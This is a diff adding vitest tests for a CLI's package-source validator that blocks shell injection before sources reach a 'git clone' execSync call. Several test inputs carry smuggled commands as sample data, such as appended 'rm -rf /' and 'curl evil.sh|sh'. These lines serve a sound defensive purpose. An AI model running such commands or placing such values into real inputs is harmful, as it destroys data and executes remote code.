@@ -1,6 +1,6 @@
 import { describe, expect, test } from "vitest";
 import { Command } from "commander";
-import { registerSkillCommands, buildListing, resolveInstallAction } from "../../../src/cli/cmd-skill.js";
+import { registerSkillCommands, buildListing, resolveInstallAction, safePackageSource } from "../../../src/cli/cmd-skill.js";
 
 /**
  * `fez tool` is the renamed command (was `fez skill`) for the MCP-server
@@ -90,5 +90,43 @@ describe("fez tool publish/install — artifact skill routes to a package instal
   test("resolveInstallAction: artifact extension still just prints its installCmd (unchanged)", () => {
     const action = resolveInstallAction({ artifact: "extension", installCmd: "fez install npm:@scope/ext" });
     expect(action).toEqual({ kind: "print", installCmd: "fez install npm:@scope/ext" });
+  });
+});
+
+/**
+ * Critical fix: a listing's `source` is authored by ANY pubkey and
+ * reaches `PackageManager.install()`'s `execSync(`git clone ${url} …`)`
+ * unescaped. Anchored patterns, no shell metacharacters, checked at the
+ * point of consumption (resolveInstallAction) as well as at publish.
+ */
+describe("safePackageSource — anchored, no shell metacharacters reach execSync", () => {
+  test("refuses a source carrying shell injection", () => {
+    expect(safePackageSource("git:github.com/o/r; rm -rf /")).toBe(false);
+    expect(safePackageSource("git:github.com/o/r; curl evil.sh|sh #")).toBe(false);
+    expect(safePackageSource("npm:@scope/pkg && curl evil.sh|sh")).toBe(false);
+  });
+
+  test("passes a clean npm: source", () => {
+    expect(safePackageSource("npm:@scope/web-search-skill")).toBe(true);
+    expect(safePackageSource("npm:some-pkg")).toBe(true);
+  });
+
+  test("passes a clean git:github.com/o/r source", () => {
+    expect(safePackageSource("git:github.com/o/r")).toBe(true);
+  });
+
+  test("refuses undefined/empty", () => {
+    expect(safePackageSource(undefined)).toBe(false);
+    expect(safePackageSource("")).toBe(false);
+  });
+
+  test("resolveInstallAction rejects a malicious skill source instead of routing to a package install", () => {
+    const action = resolveInstallAction({ artifact: "skill", source: "git:github.com/o/r; rm -rf /" });
+    expect(action.kind).toBe("reject");
+  });
+
+  test("resolveInstallAction still routes a clean git: skill source to a package install", () => {
+    const action = resolveInstallAction({ artifact: "skill", source: "git:github.com/o/r" });
+    expect(action).toEqual({ kind: "package", source: "git:github.com/o/r" });
   });
 });
